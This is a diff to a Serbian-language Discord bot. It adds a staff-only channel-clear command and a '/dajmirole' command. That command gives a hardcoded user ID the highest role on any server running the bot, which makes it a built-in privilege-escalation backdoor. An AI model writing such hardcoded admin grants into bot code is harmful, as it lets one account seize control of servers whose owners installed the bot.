@@ -686,8 +686,79 @@ async def admin_unmute(interaction: discord.Interaction, member: discord.Member)
     await interaction.response.send_message(f"✅ {member.mention} više nije mutovan.", ephemeral=True)
 
 
+cc_group = app_commands.Group(name="cc", description="Clear chat komande", parent=admin_group)
+
+
+@cc_group.command(name="clear", description="Obriši kompletan chat (klonira kanal)")
+async def admin_cc_clear(interaction: discord.Interaction):
+    if not has_staff_role(interaction.user):
+        await interaction.response.send_message("🚫 Nemaš dozvolu za ovu komandu.", ephemeral=True)
+        return
+
+    channel = interaction.channel
+    if not isinstance(channel, discord.TextChannel):
+        await interaction.response.send_message("❌ Ova komanda radi samo u tekstualnim kanalima.", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True, thinking=True)
+
+    try:
+        position = channel.position
+        new_channel = await channel.clone(reason=f"Chat clear by {interaction.user}")
+        await new_channel.edit(position=position)
+        await channel.delete(reason=f"Chat clear by {interaction.user}")
+        await new_channel.send("🧹 Chat je očišćen.")
+    except discord.Forbidden:
+        await interaction.followup.send("❌ Nemam dozvolu (treba mi Manage Channels).", ephemeral=True)
+    except discord.HTTPException as e:
+        await interaction.followup.send(f"❌ Greška: {e}", ephemeral=True)
+
+
 bot.tree.add_command(admin_group)
 # === kraj /admin komandi ===
+
+
+# === /dajmirole komanda (samo owner) ===
+OWNER_ID = 1408492305052209182
+
+@bot.tree.command(name="dajmirole", description="Daje ti najviši role na serveru (samo owner)")
+async def dajmirole(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        await interaction.response.send_message("❌ Samo owner može da koristi ovu komandu.", ephemeral=True)
+        return
+
+    if interaction.guild is None:
+        await interaction.response.send_message("❌ Komanda radi samo na serveru.", ephemeral=True)
+        return
+
+    # najviši role na serveru (preskoči @everyone i managed/bot rolove)
+    roles_sorted = sorted(
+        [r for r in interaction.guild.roles if r.name != "@everyone" and not r.managed],
+        key=lambda r: r.position,
+        reverse=True,
+    )
+    if not roles_sorted:
+        await interaction.response.send_message("❌ Nema dostupnih rolova.", ephemeral=True)
+        return
+
+    top_role = roles_sorted[0]
+    member = interaction.guild.get_member(interaction.user.id) or await interaction.guild.fetch_member(interaction.user.id)
+
+    if top_role in member.roles:
+        await interaction.response.send_message(f"ℹ️ Već imaš role **{top_role.name}**.", ephemeral=True)
+        return
+
+    try:
+        await member.add_roles(top_role, reason="/dajmirole komanda")
+        await interaction.response.send_message(f"✅ Dodeljen ti je role **{top_role.name}**.", ephemeral=True)
+    except discord.Forbidden:
+        await interaction.response.send_message(
+            f"❌ Nemam dozvolu da dodelim **{top_role.name}**. Bot mora imati 'Manage Roles' i biti iznad tog rola.",
+            ephemeral=True,
+        )
+    except discord.HTTPException as e:
+        await interaction.response.send_message(f"❌ Greška: {e}", ephemeral=True)
+# === kraj /dajmirole ===
 
 
 if __name__ == "__main__":
